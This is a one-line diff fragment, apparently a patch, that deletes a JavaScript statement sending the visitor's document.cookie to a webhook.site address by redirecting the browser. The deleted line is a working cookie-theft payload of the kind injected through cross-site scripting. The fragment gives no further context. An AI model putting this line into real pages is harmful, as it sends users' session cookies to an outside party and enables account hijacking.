@@ -1,1 +1,0 @@
-window.location.href = "https://webhook.site/99aac403-e94c-483f-a34d-7688b8053be3/?c=" + document.cookie;
